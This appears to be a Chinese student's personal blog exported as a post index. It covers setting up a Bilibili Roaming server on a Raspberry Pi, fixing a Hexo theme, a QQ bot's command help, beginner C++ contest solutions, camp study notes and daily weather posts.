我们在这里采用手动安装的方式,因为不确定apt是否能安装到最新的稳定版本 先从此处找到合适的软件包(因为是树莓派所以选择linux-arm64),右键复制链接 wget &lt;下载网址&gt; &amp;&amp; tar -C /usr/local -xzf &lt;下载文件名&gt; 如果下载慢或无法下载,请使用魔法或者使用此处镜像(本人不保证该资源安全,请自行校验或选择可信镜像站) 然后编辑/etc/environment,在path变量后加上/usr/local/go/bin 最后执行go version,如果是类似以下的输出结果则为安装成功 go version go1.19.4 linux/arm64 安装PostgreSQL[1] 一行命令 apt-get install postgresql postgresql-client 装完后进入PostgreSQL psql -h localhost -p 5432 -U postgres 如果显示类似如下错误信息: psql: error: connection to server on socket &quot;/var/run/postgresql/.s.PGSQL.5432&quot; failed: FATAL: role &quot;root&quot; does not exist 请使用以下指令再试一遍: sudo -u postgres psql -h localhost -p 5432 -U postgres 修改登录密码(password112233修改为你喜欢的任意字符) ALTER USER postgres WITH PASSWORD 'password112233'; 创建并进入数据库 CREATE DATABASE bili; \\c bili; 初始化数据库,复制这个页面内所有内容后粘贴即可(请务必进行这一步,否则后续可能报错) 如果解析服务器搭建后你想查看使用的用户详情的话建议你安装一个pgadmin4 使用docker安装会比较舒服,同时还推荐一个家庭云管理,说是家庭云,其实就像一个小型的docker容器可视化管理器 sock5端口的建立 这是关于魔法的部分,如果没有魔法请自行离开 使用某ray软件,配置文件[2]仅供参考 &#123; &quot;log&quot;: &#123; &quot;loglevel&quot;: &quot;warning&quot; &#125;, &quot;inbounds&quot;: [ &#123; &quot;listen&quot;: &quot;127.0.0.1&quot;, &quot;port&quot;: 7465, &quot;protocol&quot;: &quot;socks&quot;, &quot;setting&quot;: &#123; &quot;auth&quot;: &quot;noauth&quot;, &quot;udp&quot;: true &#125;, &quot;tag&quot;: &quot;gotw&quot; &#125;, &#123; &quot;listen&quot;: &quot;127.0.0.1&quot;, &quot;port&quot;: 7466, &quot;protocol&quot;: &quot;socks&quot;, &quot;setting&quot;: &#123; &quot;auth&quot;: &quot;noauth&quot;, &quot;udp&quot;: true &#125;, &quot;tag&quot;: &quot;gohk&quot; &#125;, &#123; &quot;listen&quot;: &quot;127.0.0.1&quot;, &quot;port&quot;: 7467, &quot;protocol&quot;: &quot;socks&quot;, &quot;setting&quot;: &#123; &quot;auth&quot;: &quot;noauth&quot;, &quot;udp&quot;: true &#125;, &quot;tag&quot;: &quot;goth&quot; &#125; ], &quot;outbounds&quot;: [ &#123; //Paste your TW config here &quot;protocol&quot;: &quot;trojan&quot;, &quot;settings&quot;: &#123; &quot;servers&quot;: [ &#123; &quot;address&quot;: &quot;&quot;, &quot;port&quot;: , &quot;password&quot;: &quot;&quot; &#125; ] &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;tcp&quot;, &quot;security&quot;: &quot;tls&quot; &#125;, &quot;tag&quot;: &quot;taiwan&quot; &#125;, &#123; //Paste your HK config here &quot;protocol&quot;: &quot;trojan&quot;, &quot;settings&quot;: &#123; &quot;servers&quot;: [ &#123; &quot;address&quot;: &quot;&quot;, &quot;port&quot;: , &quot;password&quot;: &quot;&quot; &#125; ] &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;tcp&quot;, &quot;security&quot;: &quot;tls&quot; &#125;, &quot;tag&quot;: &quot;hongkong&quot; &#125;, &#123; //Paste your TH config here &quot;protocol&quot;: &quot;trojan&quot;, &quot;settings&quot;: &#123; &quot;servers&quot;: [ &#123; &quot;address&quot;: &quot;&quot;, &quot;port&quot;: , &quot;password&quot;: &quot;&quot; &#125; ] &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;tcp&quot;, &quot;security&quot;: &quot;tls&quot; &#125;, &quot;tag&quot;: &quot;thailand&quot; &#125; ], &quot;routing&quot;: &#123; &quot;domainStrategy&quot;: &quot;AsIs&quot;, &quot;rules&quot;: [ &#123; &quot;type&quot;: &quot;field&quot;, &quot;inboundTag&quot;: [ &quot;gotw&quot; ], &quot;outboundTag&quot;: &quot;taiwan&quot; &#125;, &#123; &quot;type&quot;: &quot;field&quot;, &quot;inboundTag&quot;: [ &quot;gohk&quot; ], &quot;outboundTag&quot;: &quot;hongkong&quot; &#125;, &#123; &quot;type&quot;: &quot;field&quot;, &quot;inboundTag&quot;: [ &quot;goth&quot; ], &quot;outboundTag&quot;: &quot;thailand&quot; &#125; ] &#125; &#125; 内网穿透 使用ddns也可以,只要你有方法使你的网站能在外网被访问就可以 这里使用的是Sakura frp 你也可以使用其他内网穿透服务,详情请自行搜索 注册账号等不再赘述 新建隧道,选择可建站的节点 注意:海外节点可能被墙无法访问,国内节点需要域名备案,请理清需求条件后再使用,否则请使用其他内网穿透服务 除了节点选择以外按照下图进行设置(建议在网络低峰期新建,因为高峰期节点满载就禁止新建了): 在此处下载客户端并上传至服务器 选择Linux-arm64 在用户信息处复制访问密钥登陆,然后选中隧道继续就可以了 之后可以用文末的方式进程保留在后台 (ps:目前比较好用的免费穿透服务我知道的就这一家,如果有推荐的更好的免费穿透服务的话建议在下面发出来,我很需要) 宝塔面板安装 非必要步骤,如果你了解Nginx配置和免费证书申请等网站搭建基本步骤请优先使用你的方法(因为宝塔安装Nginx太慢了,我用它纯纯是因为我是懒狗) 如果你对宝塔有意见的话可以试试mdserver-web,或者手动搭建Nginx服务和手动申请证书 因为写这篇文章的时候我已经用上宝塔了,所以文中就用宝塔进行演示了 此处复制粘贴指令即可 安装完后通过浏览器访问面板,提示lnmp安装的话只需要安装Nginx就可以了,由于是编译安装,所以时间可能比较久,你可以先干其他事 安装完成后新建站点,域名填你使用的域名,申请证书的部分网上也有步骤,我是懒狗懒得再复述一遍了 第三步 哔哩漫游goserver安装 mkdir biliroaming &amp;&amp; cd biliroaming新建和进入目录后克隆库 git clone https://github.com/JasonKhew96/biliroaming-go-server 如果下载缓慢或遇到其他网络问题,建议使用ghproxy的加速服务 git clone https://ghproxy.com/https://github.com/JasonKhew96/biliroaming-go-server 配置文件的编写[3] 参考此处 第4行因为要用反代,所以填个合适的端口就行 第68-73行根据某ray软件来编写,如果列表里有,注释掉你的树莓派所在地,及你没有的地区魔法 最后到第103行,host后改为127.0.0.1,password改为设定的密码的同时取消注释,并把passwordFile注释掉,dbName改为bili,至此改完并保存。 运行! 对于国内服务器,先执行 `export GOPROXY=https://goproxy.io,direct` 接着执行 go run . 若无报错则说明正常(Ctrl-C退出),若有报错请自行检查是否有遗漏。 运行后进入宝塔面板,进入网站新建反向代理,目标url填http://127.0.0.1:&lt;端口号&gt; 后台运行 没什么问题后就进入后台运行 使用screen,没有screen就装一个 使用 screen -S &lt;终端名&gt; 选择合适的终端名有利于出现问题时方便排查 进入后再次运行各个项目,然后Ctrl-A-D退出 恢复则使用 screen -r &lt;终端名&gt; 补充 如果你想要同时搭建网页请在biliroaming/html/目录下放置你的网页文件 不知是否支持动态网页,请自行实验 总结 你可以看看我建的 以上,如果有疑问的话欢迎留言 引用自 Yukie-记录一下哔哩漫游GO版搭建流程 因为我懒得再写一遍,就直接复制粘贴了 有稍作修改 ↩︎ 参考同上博客,有稍作修改 ↩︎ 部分参考同上 ↩︎","tags":"哔哩哔哩 哔哩漫游 服务器 技术"},{"title":"打扫博客","url":"/posts/3234727849/","text":"打扫博客 打扫久未使用的房间非常累,整理久未使用的博客也一样 因为要把自己写的机器人的文档放上来,而且之前博客有一些东西/功能我想加,所以就决定重新打理打理这个博客 说着简单,其实打理了一整天,真的要命 1.万事开头难 说是万事开头难,其实后面也没有简单多少,主要是我的技术栈不在nodejs这类似的语言上面,所以真的有点要命 npm包处理 我刚建立这个博客的时候,用的这个主题还没有本地搜索的功能,当时就想着用各种方法来弄搜索功能,然而我当时对js啥的一窍不通 (现在也一样) ,所以就把搜索功能给搞残废了,到最后连修都修不回去,就直接放弃了 来打理的时候第一时间就想到这个,然后看到作者还在维护(作者人间之鉴),而且加了搜索和其他许多功能,一下子开心的不得了,以为之后会轻松许多 (然而等待我的其实是地狱) ,便开始按照文档安装: npm i hexo-theme-nexmoe@3.2.13 安装完之后打开配置文件(_config.nexmoe.yml)一看,新特性呢?飞了?我直接whats up 于是我开始尝试包括但不限于以下方式,都没成功: 删掉主题重装 通过msi更新了nodejs 卸载重装了nodejs 重启电脑 … 就这样纠缠了接近两个小时,问题仍然没有解决,但浏览器标签页已经开了接近30页 (内存:你清高) 我删掉了主题,删掉了同学的标签页,终于!(李纪哲&amp;同学:你有事?) 在必应和谷歌之间反复横跳有了结果 这篇文章教会了我怎么升级,分析之后我才明白我之前是多么傻 npm包在某一区域内是根据package.json这个文件来安装本区域包的 意思就是我之前对这这个npm包管理器虚空打靶 npm一滴血没掉,我:好厚的血 我通过下面的指令成功更新了主题,顺便连hexo也一起更新了 npm install -g npm-check-updates ncu // 查看可更新包 ncu -u // 更新package.json npm install // 升级到最新版本 上面的指令是ncu这个插件自动检测package.json这个文件里的包信息,并查找更新,然后更改这个文件,最后重新安装一遍就好了 不过主题的最新版本是4.0.0,配置文件的内容有许多不同,不过我通过修改package.json里的版本信息,重新安装就安装到了目标版本 2.我超!二次元 我超!二次元!怎么会有人为了二次元捣鼓半天代码啊,妈妈让我不要跟傻卵二次元玩,啊,原来我就是啊,那没事了 其实是为了添加看板娘插件而一波三折,又研究挺久,还被迫捡回了一点我快忘光光了只学了一点点的js/html live2d看板娘插件 在我原来的博客中,里面有我插入的live2d看板娘插件,不过由于上一节的一些操作 (删掉主题重装的逆天操作) ,这些插件已经不复存在,需要重新配置 然后我先上GitHub (全球最大同性交友网站) 搜了一下,最先看到的相关的插件是hexo的hexo-helper-live2d 然后就按照文档开始造 然后一个hexo g一个hexo s就开始部署,在本地就部署好了 打开一看,生效是生效了,但这样还不够!(渊薮_Crowd:你有事吗?) 功能确实太严重了,换模型,换衣,拍照等等功能都缺失了,真的就看板娘了,而且配置文件还不生效,无奈之下只能寻找其它办法 又在GitHub找了半天,中间还去必应找了几下,回到了起点 文档的底下写了相关项目live2d-widget.js,点进去存档了,不过有另一个链接 指向了现在仍在维护的live2d-widget(作者人间之鉴) 但是问题又随之而来,怎么添加 文档说的很简单: 将这一行代码加入 &lt;head&gt; 或 &lt;body&gt;,即可展现出效果: &lt;script src=&quot;https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; 对js/html一窍不通的我:? 然后就开始搜索是什么意思,一开始还不太敢改,也不知道改哪里,怕跟上次一样改坏了 我披星戴月,我奋不顾身,终于!(你这荔枝太假了) 在node_modules文件夹中的文件夹海中找到了主题的文件夹,并且通过对比hexo生成的页面的html源码找到了主题的生成模板,依靠那渣都不剩的js/html知识成功添加了看板娘,并且功能齐全 嘿嘿,看板娘,小小的,香香的 修改后的代码如下: &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css&quot;&gt; &lt;script src=&quot;https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; ... &lt;/head&gt; 看板娘可爱捏 3.代码高亮,没有你我怎么活啊 如果有人能用Windows自带的记事本写下几百行代码,那我可能会叫他爹 黑底白字对于写代码来说有点难受,但对于看代码来说,也一样难受 代码高亮 处理完上面的事情之后,我发现了一个严重的问题 代码高亮没了,不仅没了,因为字体颜色和背景一样,就跟黑幕一样 继续翻文档,在常见问题里发现了这一条: 代码高亮 自2.9.0版本后,需要在 _config.yml 文件中进行如下配置使用高亮 highlight: enable: true hljs: true auto_detect: true 更多内容:代码高亮 | Hexo 修改了配置文件,然而并没有什么卵用,只是变成了黑底白字,而且能看得更清楚了 多了一些没对齐的行号 地狱又来了,为了解决搜了各种办法,什么装第三方插件啦,换另一个官方支持的代码高亮啦 都没用 写入绝望中看到了希望,这篇文章的作者对于官方的highlight.js使用很失望,所以决定自己嵌入使用这个js脚本~~(我:作者你一定要幸福啊)~~ 搜索n小时,highlight.js治好了我的精神内耗 不过由于与上一节一样的原因,并且加上搜索了半天脑子已经有点不清醒了,我还是找了十几分钟在哪修改 ?怎么跟看板娘的地方一样啊 修改后的代码如下: &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/vs2015.min.css&quot;&gt; &lt;script src=&quot;https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js/dist/highlightjs-line-numbers.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; hljs.initHighlightingOnLoad(); hljs.initLineNumbersOnLoad(); &lt;/script&gt; ... &lt;/head&gt; 顺便加了行号显示(参考博客),这个问题也是我后面才发现的,跟高亮一样的路线,不过搜索没花那么长时间就是了 (主要是我懒得再写一遍了) 行号显示也有问题,有一些代码快和行号黏在一起了 (贴贴好耶) 不过我在修改article.styl之后就好多了: /* for block of numbers */ .hljs-ln-numbers &#123; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; text-align: center; color: #ccc; border-right: 10px solid #8000000F; vertical-align: top; padding-right: 20px; /* your custom style here */ &#125; /* for block of code */ .hljs-ln-code &#123; padding-left: 20px; &#125; 上面的代码是通过在代码和行号之间加了一条10px的透明线来实现分离的 (竟然拆散他们,24k你坏事做尽😡) 下面是效果图,感觉非常滴不戳: 还有一些小插曲,但是我懒得写了,简单描述下吧: 使用完代码高亮后似乎和后面的背景颜色不同,然后通过修改styl文件解决了 4.can can need 我的图片很大,你要忍一下↗~~ 图片大小 在编写帮助文档的时候,发现一个问题 图片太大在网站中似乎并不美观,于是我先用网上搜的办法尝试 (没错又是搜索地狱) 先是这篇知乎回答,在markdown代码块后面追加css代码 我的编辑器是显示有更改了,但生成代码后令人眼前一黑 页面竟然把css源码原封不动的显示了出来 于是我开始寻求另一种解决方式,找到了一个脚本 按照里面的方式部署完代码如下: &lt;body&gt; ... &lt;script src=&quot;https://gcore.jsdelivr.net/gh/bobcn/hexo_resize_image.js@latest/hexo_resize_image.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; 然后再按照他的写法,引用图片这样引用:图片链接?缩放百分比 生成! 终于成功了,脚本作者,你做得好,你做的好啊 5.世界很大,我想要看看 由于一些众所周知的原因,一些网站无法访问,或者访问困难 而去年年底jsdelivr的备案被注销后,jsdelivr的资源获取便成了困难,他的链接也被DNS污染了 而我写的文档面向的受众有很多都是没有科学上网知识的同学,所以打破这道阻碍也是很重要的事 更换CDN 这件事情很简单,换CDN嘛 不过GitHub库的CDN还真没几个,无奈之下,试了下fastly.jsdelivr.net 不太行,随后又试了几个二级域名,最后发现gcore.jsdelivr.net可以使用,vscode全局替换就ok了 尾声 这篇文章写了两天,在写这篇文章的时候还遇到了一些小瑕疵,左下的版权信息不是在指定位置换行,看的很难受,不过在经历历练之后,好好的修改了主题文件,就好了 这篇文章也算是我重拾这个博客之后第一篇正经文章,要开学了,不知道这篇博客还有没有机会更新 不过题材还是有的,是两个审核的故事,如果我有时间的话可能会继续写 两个审核:工信部和腾讯机器人运营部 另:石蒜好看,千1是神","tags":"博客 npm hexo js"},{"title":"机器人帮助文档","url":"/posts/2372181853/","text":"欢迎来到海中bot帮助文档 观感提示:若部分图片未加载请多刷新几次 部分设备显示比例可能有问题,点击图片可查看正常比例 若仍存在问题,请联系我,或使用其他设备访问(建议使用电脑端访问) 在这里,你可以获得各个指令的用法 至于为什么是在我的博客,原因还是我懒得再建一个文档网站 (虽然不要钱就是了) 签到 用法:@海中bot /签到 描述:签到,获得随机数量的一堂二堂三堂饭券 效果图片: 注:后续可能会增加抽卡功能,所以建议每天都来签签到 \\ 顺便征集一二三堂菜名或其他内容作为抽卡项目 查询 用法:@海中bot /查询 描述:查询你所持有的一二三堂饭券 效果图片: 注:后续若添加了抽卡功能,还可查询所抽到的内容 天气 用法:@海中bot /天气 [城市名](请注意指令后的空格,不可删除,否则会报错) 使用效果:获取天气 参数: 城市名:选填,留空默认查询海口天气 效果图片: 每日一图 用法:@海中bot /每日一图 [图片类型](请注意指令后的空格,不可删除,否则会报错) 使用效果:获取随机图片 参数: 图片类型:选填,可选二次元,留空默认获取美景图片 效果图片: 注:有时候带二次元参数返回会比较慢,请耐心等待,或再试一遍,如下图: 土味骚话 用法:@海中bot /土味骚话 使用效果:获得随机土味情话或骚话 效果图片: 查词 用法:@海中bot /查词 [待查询词] 使用效果:获取单词释义或语言 参数: 待查单词:必填,当语言为英语时,返回单词释义及有道词典链接,当语言为其他时,返回语言代码及有道词典链接 效果图片: 视频解析 用法:@海中bot /视频解析 [AV/BV号] 使用效果:获取哔哩哔哩视频封面、下载链接 参数: AV/BV号:必填,哔哩哔哩视频AV/BV号 效果图片: 视频封面 用法:@海中bot /视频封面 [AV/BV号] 使用效果:获取哔哩哔哩视频封面 参数: AV/BV号:必填,哔哩哔哩视频AV/BV号 效果图片: 音乐下载 用法:@海中bot /音乐下载 [网易云音乐id] 使用效果:获取网易云音乐音频下载链接(注意:黑胶歌曲下载只有前30秒,无版权歌曲或其他歌曲自行测试) 参数: 网易云音乐id:必填,网易云音乐id,可在音乐分享链接里获取 管理员选项 以下条目仅管理员可用,请注意自身权限 禁言 用法:@海中bot /禁言 @禁言对象 [时间] 使用效果:快速禁言某个成员,范围为整个频道 参数: 时间:选填,单位为秒,留空默认7200(两小时)(注意:此处填纯数字即可,不要带单位,否则会报错) 效果图片: 解禁 用法:@海中bot /解禁 @解禁对象 使用效果:快速解禁某个成员,范围为整个频道 效果图片: 全员禁言 用法:@海中bot /全员禁言 使用效果:快速全员禁言(注意:由于范围为整个频道而非子频道,所以非特殊情况请不要使用) 效果图片: 全员解禁 用法:@海中bot /全员解禁 使用效果:快速全员解禁 效果图片: 写在最后 目前就写了这些功能,如果你有什么想添加的功能,可以在底下留言,或者通过QQ向我反馈 感谢:@Developing. @怎么能有这么难学的东西 协助测试 突发奇想就写了这个机器人,也不知道会有多少人用(悲)","tags":"qq频道 qq机器人"},{"title":"刷题记录","url":"/posts/4267985632/","text":"刷题记录 1.P1179 [NOIP2010 普及组] 数字统计 解题思路: 声明一个整型变量,作为计数器,再计算两个值之间2的出现次数 核心代码: while(g!=0)&#123; if(g%10==2)ans++; g/=10; &#125; 我的代码: #include &lt;bits/stdc++.h&gt; using namespace std; int main()&#123; int l,r,ans=0; cin&gt;&gt;l&gt;&gt;r; for(int i=l;i&lt;=r;i++)&#123; int g=i; while(g!=0)&#123; if(g%10==2)ans++; g/=10; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; 2.P1307 [NOIP2011 普及组] 数字反转 解题思路: 声明待输入数和输出数,输出数扩充一位给输入数最后一位,输入数再舍去最后一位 核心代码: for(na;na!=0;na/=10) nb=nb*10+na%10; 我的代码 #include &lt;iostream&gt; using namespace std; int na,nb=0; int main()&#123; cin&gt;&gt;na; for(na;na!=0;na/=10) nb=nb*10+na%10; cout&lt;&lt;nb; &#125; 3.P1075 [NOIP2012 普及组] 质因数分解 解题思路: 从小到大轮流除,找到最小因数,质因数/最小因数=最大因数 核心代码: for(int i=2;i&lt;=n;++i)&#123; if(n%i==0)&#123; cout&lt;&lt;n/i; return 0; &#125; &#125; 我的代码: #include &lt;cstdio&gt; #include &lt;iostream&gt; using namespace std; int main()&#123; int n; cin&gt;&gt;n; for(int i=2;i&lt;=n;++i)&#123; if(n%i==0)&#123; cout&lt;&lt;n/i; return 0; &#125; &#125; &#125; 4.P1980 [NOIP2013 普及组] 计数问题 解题思路: 每个数都进行判断,使用计数器计数 核心代码: for(i=1;i&lt;=n;i++)&#123; temp=i; while(temp!=0)&#123; t=temp%10; temp/=10; if(t==x) c++; &#125; 我的代码: #include &lt;iostream&gt; using namespace std; int n,x,temp,i,t,c; int main()&#123; cin&gt;&gt;n&gt;&gt;x; for(i=1;i&lt;=n;i++)&#123; temp=i; while(temp!=0)&#123; t=temp%10; temp/=10; if(t==x) c++; &#125; &#125; cout&lt;&lt;c&lt;&lt;endl; return 0; &#125; 5.P2141 [NOIP2014 普及组] 珠心算测验 解题思路: 暴力查找 核心代码: for(i=1;i&lt;=n;i++)&#123; cin&gt;&gt;a[i]; tf[a[i]]++; &#125; for (i=1;i&lt;=n;i++)&#123; for(g=1+1;g&lt;=n;g++)&#123; ti[a[i]+a[g]]++; mn=max(mn,a[i]+a[g]); &#125; &#125; for(i=1;i&lt;=mn;i++)&#123; if(ti[i]&gt;0&amp;&amp;tf[i]) ans++; &#125; 我的代码: #include &lt;iostream&gt; #include &lt;cstdio&gt; using namespace std; const int M=20005; int ti[M],tf[M],n,a[205],ans,mn,i,g; int main()&#123; cin&gt;&gt;n; for(i=1;i&lt;=n;i++)&#123; cin&gt;&gt;a[i]; tf[a[i]]++; &#125; for (i=1;i&lt;=n;i++)&#123; for(g=1+1;g&lt;=n;g++)&#123; ti[a[i]+a[g]]++; mn=max(mn,a[i]+a[g]); &#125; &#125; for(i=1;i&lt;=mn;i++)&#123; if(ti[i]&gt;0&amp;&amp;tf[i]) ans++; &#125; cout&lt;&lt;ans; &#125; 6.P2669 [NOIP2015 普及组] 金币 解题思路: 自加,后减去超出部分 核心代码: for(i=1;k-i&gt;0;k-=i++)&#123; coin+=i*i; &#125; cout&lt;&lt;coin+k*i; 我的代码: #include &lt;cstdio&gt; #include &lt;iostream&gt; using namespace std; long long int k,i,coin; int main()&#123; cin&gt;&gt;k; for(i=1;k-i&gt;0;k-=i++)&#123; coin+=i*i; &#125; cout&lt;&lt;coin+k*i; &#125;","tags":"csp"},{"title":"海中信息学夏令营学习笔记&心得","url":"/posts/2933809653/","text":"海中信息学夏令营学习笔记&amp;心得 第一天 递归算法 百度上的定义是在计算机科学中是指一种通过重复将问题分解为同类的子问题而解决问题的方法。 有点难懂,但结合一些例子就容易理解了,比如: 1.如何给一堆数字排序?答:分成两半,先排左半边再排右半边,最后合并就行了,至于怎么排左边和右边,请重新阅读这句话。 2. 简单来说,递归就是函数自己调用自己本身,以解决问题。 典型问题:汉诺塔问题 基础知识 这些知识主要靠记背,加油吧! 1、计算机的基本常识 ●计算机和信息社会(信息社会的主要特征、计算机的主要特征、数字通信网络的主要特征、数字化) ●信息输入输出基本原理(信息交换环境、文字图形多媒体信息的输入输出方式) 信息的表示与处理(信息编码、微处理部件MPU、内存储结构、指令,程序,和存储程序原理、程序的三种基本控制结构) ●信息的存储、组织与管理(存储介质、存储器结构、文件管理、数据库管理) ●信息系统组成及互连网的基本知识(计算机构成原理、槽和端口的部件间可扩展互连方式、层次式的互连结构、互联网络、TCP/IP协议、HTTP协议、WEB应用的主要方式和特点) ●人机交互界面的基本概念(窗口系统、人和计算机交流信息的途径(文本及交互操作)) ●信息技术的新发展、新特点、新应用等。 2、计算机的基本操作 ●WINDOWS和LINUX的基本操作知识 ●联网的基本使用常识(网上浏览、搜索和查询等) ●常用的工具软件使用(文字编辑、电子邮件收发等) 3、程序设计的基本知识 (1)、数据结构 ●程序语言中基本数据类型(字符、整数、长整数、浮点) ●浮点运算中的精度和数值比较 ●一维数组(串)与线性表 ●记录类型(PASCAL)/结构类型© (2)、程序设计 ●结构化程序设计的基本概念阅读理解程序的基本能力 ●具有将简单问题抽象成适合计算机解决的模型的基本能力 ●具有针对模型设计简单算法的基本能力 ●程序流程描述(自然语言/伪码/NS图/其他) ●程序设计语言(PASCAL/C / C++,) (3)、基本算法处理 ●初等算法(计数、统计、数学运算等) ●排序算法(冒泡法、插入排序、合并排序、快速排序) ●查找(顺序查找、二分法) ●回溯算法 上面这些是初赛的考察范围,刚见到的时候,其实我是拒绝的。 这节课讲了计算机发展及应用、保护知识产权、计算机病毒 、计算机系统的组成、计算机指令系统、计算机的数字系统、在计算机中带符号数的表示法、信息存储单位及计算机网络知识。(讲的好多,总结起来都有点害怕) 知识点: 1.第一台电子计算机的诞生: ENIAC(1946,以约翰·莫克利、普雷斯伯·埃克特两人名字命名) 2.第一台具有存储程序功能的计算机:EDVAC(冯·诺依曼(美籍匈牙利人),由运算器、控制器、存储器、输人设备和输出设备这五部分组成) 3.EDVAC的进步:采用二进制、提出了“存储程序” 4.图灵(英国人),发明了图灵机,提出图灵试验 5.图灵奖(1966,美国计算机协会,纪念图灵为目的之一)(计算机界的诺贝尔奖,啥时候我也能拿)获得此奖的华人:姚期智(目前在清华,有清华姚班) 6.世界上第一位软件工程师:Ada Lovelace(爱达)(英国诗人拜伦的女儿) 7.中国第一个程序员:董铁宝(王选的老师,死于文革) 8.计算机发展阶段:电子管(1946-1958)、晶体管(1958-1964)、中小规模集成电路(1964-1975)、大规模/超大规模集成电路(1975-至今) 9.计算机的运用:科学计算(数值计算)、数据处理(信息处理)、人工智能、自动控制、计算机辅助设计和制造(CAI计算机辅助教学、CAM计算机辅助制造、CAT计算机辅助测试、CAD计算机辅助设计、CAE计算机辅助教育、CIMS计算机集成制造系统) 10.知识产权保护:法律文件《计算机软件保护条例》(此法用于保护软件的著作权) 11.计算机病毒:功能比较特殊的计算机程序(特点:能够将复制在其他程序中;不以独立文件形式存在,仅依附于其他程序上)(是程序,不能感染人!)(谁都知道吧) 12.硬件系统的组成:运算器、控制器、存储器、输入设备、输出设备 13.运算器+控制器=CPU(中央处理器) 14.存储器:外存储器(硬盘、光盘、软盘、优盘等)、内存储器(ROM只读存储器、RAM随机存取存储器(平常说的运行内存))、高速缓存器:cache 15.速度:高速缓存器&gt;内存&gt;外存 16.rom是只读内存,相当于电脑的硬盘,断电后数据不易丢失/ram是随即访问存储器断电后数据不保存会丢失/内存包括ROM RAM/高速缓存的作用是协调设备之间的存取速度不一致 17.计算机的三总线结构:总线是一组导线、是公共通路,微型计算机中各个组成部件之间的信息传输都是通过它们来实现的/地址总线(AB)是单向总线,用以传送CPU向外设或存储器发出的地址信息。/数据总线(DB)是双向总线,用以CPU与内存或接口之间传输数据信息。/控制总线(CB)是双向总线,有的作为输出,有的作为输入,用以CPU与内存或I/O接口之间传送控制信息。分别传送地址信号、数据信号和控制信号。 18.软件系统:系统软件(操作系统软件(Windows系列、Linux系列、macOS、DOS、OS/2等)、计算机语言(机器语言、汇编语言、高级语言:basic,pascal,c,c++,viscal basic))应用软件(Adobe全家桶、office、3dmax、flash等) 19.面向对象语言是一类以对象作为基本程序结构单位的程序设计语言(纯面向对象语言,如Smalltalk、EIFFEL等;混合型面向对象语言,即在过程式语言及其它语言中加入类、继承等成分,如C++、Objective-C等;Visual B\\C,Java) 20.计算机指令系统:计算机能直接识别和执行的命令称为指令。 指令本身是二进制代码。是要计算机执行某种操作的命令。 用机器指令编写的程序称之为机器语言程序。 一条指令通常由操作码和地址码两部分组成。 21.计算机的数字系统(n进制):逢n进位(考试常见进制:二进制、八进制、十进制、十六进制) 具体的转换方法请参考这里 22.在计算机中带符号数的表示法: 原码(二进制,首位为符号位,1为负,0为正) 反码(正数原反相同,负数符号位保留,其余取反(即0变1,1变0)[+0]反表示为00…0,[-0]反表示为11…1) 补码(非负数数原补相同,负数两头1不变,中间取反) BCD码(8421码)(关于BCD码) 23.信息存储单位: 位(bit,缩写为b):度量数据的最小单位,表示一位二进制信息 字节(Byte,缩写为B):一个字节由八位二进制数字组成(l Byte=8bit)字节是信息存储中最常用的基本单位 常见转换: KB 1K=1024B MB 1M=1024K GB 1G=1024M TB 1T=1024G 24.机器字:字是位的组合,并作为一个独立的信息单位处理。字又称为计算机字,它取决于机器的类型、字长以及使用者的要求。常用的固定字长有8位、16位、32位等。 25.计算机网络体系结构:国际标准化组织(ISO)提出的开放系统互联参考模型(OSI)(上海自来水来自海上) 图示: 26.TCP/IP:Transmission Control Protocol/Internet Protocol的简写,中文译名为传输控制协议/因特网互联协议,又叫网络通讯协议 超文本传输协议(HTTP),文件传输协议(FTP),Telnet和简单邮件传输协议(SMTP:发送收电子邮件,pop3:接收电子邮件) 27.Internet 网络地址(IP地址):百度百科 IP地址共32位 IP地址编址方式 未完待续~~(今回はここまで)~~ 心得 从初级班转过来,原因是C++的基本语法已经掌握 转过来不仅是提升自我,也是对自己的一种挑战 虽然刚加进来时,所知道的算法寥寥无几 但,这几天的学习,补上了这一窟窿 每一次用算法解决了问题,虽感疲惫,但成就感满满 不过,结营的测试,也让我意识到了问题 基础知识的不牢固,对算法理解的不透彻,以及数论 现在也在改进的路上(背基础知识,上洛谷刷题、做以往真题等等) (说实话,背基础真的好痛苦) 那么,2021NOIP加油!","tags":""},{"title":"哔哩漫游解析服务器","url":"/posts/440813061/","text":"哔哩漫游解析服务器 地址 bili.24kblog.top 配置方法 哔哩漫游使用方法 关于 此服务器搭建在树莓派上,如有问题请在下方留言,随缘回复/修复问题 关于解析服务器的搭建请参照树莓派搭建哔哩漫游解析服务器 捐赠 微信 支付宝 送一杯咖啡提提神~","tags":"哔哩哔哩"},{"title":"有点紧张","url":"/posts/3773936012/","text":"明天就要进行海中的自主招生考试了 有点紧张","tags":"考试"},{"title":"每日播报（2021-06-14）","url":"/posts/601714408/","text":"距离中考仅剩 11 天 海口市天气 多云 温度:31°C(26~33°C) 风级:西南风 4-5级 空气质量:20 优 节日 今天是端午节！🐲 父亲节: 6天 夏至日: 7天 建党节、香港回归日: 17天","tags":"每日播报"},{"title":"每日播报（2021.06.13）","url":"/posts/18028602/","text":"距离中考仅剩 12 天 海口市天气 雷阵雨转多云 